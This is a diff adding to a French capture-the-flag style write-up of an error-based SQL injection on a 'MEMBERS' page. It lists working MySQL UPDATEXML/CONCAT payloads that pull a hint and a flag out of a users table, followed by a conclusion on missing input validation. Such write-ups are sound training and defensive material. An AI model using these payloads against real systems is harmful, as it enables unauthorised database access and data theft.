@@ -53,7 +53,16 @@ En raison des limitations d’affichage, l’extraction a été réalisée en pl
 * **Payload (partie 1) :**`1 AND UPDATEXML(1, CONCAT(0x7e,(SELECT SUBSTRING(Commentaire,65,32) FROM users LIMIT 3,1),0x7e), 1)*`
 * **Message reconstitué :** Decrypt this password -> then lower all the char. sha256 on it and it's good !
 * **Preuves visuelles: **
-screenshots/6.1 Commentaire_part1.png
-screenshots/6.2 Commentaire_part2.png
-screenshots/6.3 Commentaire_part3.png
+* `screenshots/6.1 Commentaire_part1.png`
+* `screenshots/6.2 Commentaire_part2.png`
+* `screenshots/6.3 Commentaire_part3.png`
   
+### Étape 7 : Reconstitution explicite du plaintext
+Une concaténation contrôlée de colonnes applicatives permet d’afficher directement le plaintext attendu.
+* **Payload :** `1 AND UPDATEXML(1, CONCAT(0x7e,(SELECT CONCAT_WS(0x3a, first_name, last_name, planet)FROM users LIMIT 3,1),0x7e), 1)`
+* **Résultat :** `~Flag:GetThe:42~`
+* **Preuve visuelle :** `screenshots/Plaintext_Flag_GetThe_42.png`
+  
+## 3. Conclusion
+L’exploitation de la SQL Injection error-based sur la page `MEMBERS` a permis l’énumération complète de la base de données, l’extraction d’un hash MD5 sensible, l’analyse d’un indice applicatif stocké en base et la reconstitution du plaintext final.  
+Cette faille démontre une absence de validation des entrées utilisateur et une mauvaise gestion des erreurs SQL, permettant l’exfiltration de données sensibles.
